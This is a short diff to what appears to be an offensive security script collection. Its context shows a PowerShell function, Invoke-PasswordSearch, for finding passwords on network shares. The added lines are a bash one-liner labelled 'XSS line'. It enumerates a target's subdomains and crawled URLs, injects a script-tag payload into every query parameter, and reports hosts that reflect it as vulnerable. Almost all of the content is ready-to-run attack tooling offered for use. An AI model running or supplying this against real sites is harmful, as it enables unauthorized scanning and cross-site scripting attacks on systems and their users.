@@ -168,3 +168,8 @@ function Invoke-PasswordSearch {
 
 # Voorbeeld van het aanroepen van de functie en het opslaan van de resultaten in een variabele
 # $searchResults = Invoke-PasswordSearch -SharesFilePath "C:\path\to\shares.txt"
+~~~~
+XSS line
+~~~~
+echo target.com | subfinder -silent | katana -silent | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m Vulnerable"; done
+
